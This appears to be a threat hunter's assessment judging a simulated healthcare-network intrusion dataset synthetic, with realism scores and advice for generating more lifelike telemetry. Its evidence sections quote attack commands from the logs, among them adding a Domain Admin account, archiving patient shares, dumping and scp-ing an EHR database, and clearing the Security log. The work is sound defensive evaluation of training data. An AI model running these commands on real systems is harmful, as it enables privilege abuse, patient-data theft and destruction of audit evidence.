# Threat Hunter - Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Confidence:** 76

## Executive Summary

This dataset is highly coherent and huntable, with a believable intrusion chain spanning Windows Security, Sysmon, ECAR, Zeek, and bash history. However, the human/admin background activity has a noticeably generated texture: repeated command pools, repeated typo-like artifacts, and role-agnostic use of the same dev/admin commands across unrelated hosts and users. I assess it as synthetic, but relatively high quality.

## Evidence For Synthetic

- `*/bash_history/*.bash_history`: 833 bash commands contain only 285 unique commands; many exact admin checklist commands repeat 5-7 times across unrelated hosts/users, including `cat /proc/meminfo | head -5`, `sysctl -a 2>/dev/null | grep net.ipv4.ip_forward`, `du -sh /var/log/*`, `vmstat 1 5`, `iptables -L -n`, and `systemctl restart sshd`.
- Multiple bash histories contain the same typo/noise tokens across different users and hosts: `lss` appears in `DB-PROD-01.../aisha.johnson.bash_history`, `WEB-EXT-01.../marcus.chen.bash_history`, `WEB-EXT-01.../lina.nguyen.bash_history`, and `APP-INT-01.../marcus.chen.bash_history`; `sl` appears five times in `DB-PROD-01`, `PROXY-01`, and `APP-INT-01` histories. That looks like seeded human imperfection rather than organic mistakes.
- ECAR shows a constrained dev-command vocabulary reused broadly: `kubectl get nodes -o wide` appears 16 times across `DB-PROD-01`, `WEB-EXT-01`, `PROXY-01`, `WS-LNGUYEN-01`, and `APP-INT-01`; the same pod names recur (`web-frontend-8c9a1`, `api-server-7d8f9`, `redis-cache-f5e6d`, `worker-3b4c2`) across multiple hosts and users.
- `DB-PROD-01.meridianhcs.local/ecar.json` has non-DB-oriented devops commands from several users, such as `kubectl logs redis-cache-f5e6d --tail=100` at `2024-03-18T12:03:55Z`, `curl ... grafana.corp.local` at `15:05:30Z`, and repeated `kubectl`/Grafana/Jira/GitLab commands. A few are plausible; the density and reuse feel generated.
- The attack tradecraft vocabulary is a little too narratively tidy: `svc_mhsync`, `DeviceSyncSvc`, `cache_7f3a.zip`, and `api.westbridge-services.net/v2/manifest` form a clean lab-style chain with clear breadcrumbs in `DC-01`, `FILE-SRV-01`, and `DB-PROD-01`.
- Endpoint lifecycle coverage is very complete for short-lived commands. For example, `FILE-SRV-01.../windows_event_security.xml` and `windows_event_sysmon.xml` show process create/terminate pairs for `net.exe` and PowerShell around `17:00:51-17:00:59Z`; ECAR mirrors those process lifecycle events. This is useful for hunting, but cleaner than many real enterprise telemetry exports.

## Evidence For Real

- The core intrusion story is coherent and pivotable. `WS-AJOHNSON-01.meridianhcs.local/ecar.json` shows domain discovery at `15:19:43-15:19:46Z` with `whoami /all`, `net user /domain`, and `net group "Domain Admins" /domain`; matching Security/Sysmon events exist in the same host XML.
- `DC-01.meridianhcs.local/windows_event_security.xml` shows realistic PsExec-style service activity: Event ID 4697 for `PSEXESVC` at `15:59:45Z`, then `C:\Windows\PSEXESVC.exe`, then `cmd.exe /c whoami && hostname`.
- Domain account abuse is strongly represented: `net user svc_mhsync MhsSvc!2024 /add /domain` at `16:14:30Z`, Event ID 4720 account creation at `16:14:32Z`, `net group "Domain Admins" svc_mhsync /add /domain` at `16:14:32Z`, and Event ID 4728 at `16:14:33Z`.
- Lateral movement and collection are believable: `FILE-SRV-01.../windows_event_security.xml` shows `svc_mhsync` LogonType 3 from `10.10.1.35` at `17:00:44Z`, followed by `net view \\FILE-SRV-01` and `Compress-Archive` into `C:\ProgramData\Microsoft\cache_7f3a.zip`.
- Linux-side data staging is plausible: `DB-PROD-01.../bash_history/root.bash_history` shows `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`, `gzip -9`, and `scp ... root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`; ECAR has matching file creation and SCP process entries.
- Network telemetry includes broad enterprise noise: Kerberos, LDAP, SMB, DHCP, proxy CONNECTs, Windows Update, Google Update, APT, public DNS resolvers, web traffic, and inbound web activity to `ehr-portal.meridianhcs.com`.
- Security-log clearing is not omitted: `DC-01.../windows_event_security.xml` includes `wevtutil cl Security` and Event ID 1102 after the encoded PowerShell execution at `17:42:08-17:42:10Z`.

## Detailed Analysis

The attack chain begins on `WS-AJOHNSON-01` with low-noise domain reconnaissance at `15:19:43Z`: `whoami /all`, `net user /domain`, and `net group "Domain Admins" /domain`. This is followed by a remote execution path on `DC-01`: `PSEXESVC` service installation at `15:59:45Z`, a validation command at `15:59:48Z`, privileged domain account creation at `16:14:30Z`, Domain Admin addition at `16:14:32Z`, and persistence via `DeviceSyncSvc` plus a scheduled task around `16:19:51-16:19:54Z`.

The lateral movement is huntable. `svc_mhsync` requests Kerberos from `10.10.1.35` to `host/FILE-SRV-01` at `17:00:44Z`, then logs on to `FILE-SRV-01` and runs collection commands. The file server collection path is coherent: `net view \\FILE-SRV-01`, then PowerShell `Compress-Archive` against Finance and Patients shares, writing `C:\ProgramData\Microsoft\cache_7f3a.zip`.

The Linux database exfil path is also coherent. On `DB-PROD-01`, root dumps `ehr patients insurance_claims` at `17:14:48Z`, creates `/tmp/rpt_0318.sql`, gzips it, then SCPs to `10.10.2.30`. `APP-INT-01.meridianhcs.local/ecar.json` shows `/tmp/.cache/rpt_0318.sql.gz` created at `17:15:53Z`, which makes a solid pivot target.

The strongest synthetic indicators are not the attack correlations themselves, but the background behavior. Bash histories across Linux systems show a repeated checklist-like pool of commands with repeated humanizing typos. ECAR repeats the same Kubernetes and SaaS/API commands across too many users and hosts, including database and proxy servers. This creates entropy at the surface level, but the entropy is drawn from a small reusable palette.

The Zeek layer is good enough to avoid easy dismissal. It includes sensor-perspective duplication, realistic proxy traffic, DNS, DHCP, SMB file records, SSL/X509, public update services, and internal web traffic. The Windows logs also contain useful rare artifacts such as Event IDs 4697, 4720, 4728, 1102, 4648, and Sysmon Event IDs 1, 3, 5, 7, 10, 11, 13, and 22. Those are strong realism points.

## Realism Score by Category

- **Field format accuracy:** 8 - Windows, Sysmon, Zeek, ECAR, and bash fields are mostly plausible and internally well-formed.
- **Temporal patterns:** 7 - Attack timing is coherent, but background activity has patterned command reuse and tidy lifecycles.
- **Cross-source correlation:** 9 - Strong pivotability across endpoint, domain controller, file server, database host, and Zeek.
- **Behavioral realism:** 6 - The intrusion is realistic, but user/admin noise feels generated from reusable command pools.
- **Environmental consistency:** 7 - Host roles, domains, IP ranges, and services mostly align, with some over-broad devops activity on unlikely hosts.

## Recommendations

- Increase per-user command diversity and reduce exact reuse of command strings across hosts.
- Make typo/noise behavior user-specific; avoid distributing the same fake mistakes across multiple personas.
- Give different roles distinct tool habits: DB admins, web admins, proxy admins, developers, and helpdesk users should not share the same `kubectl`/curl/admin checklist vocabulary.
- Add more partial, messy, or ambiguous telemetry around attack steps without breaking causal consistency.
- Vary benign administrative workflows with more host-local artifacts, failed attempts, pauses, and mundane distractions.
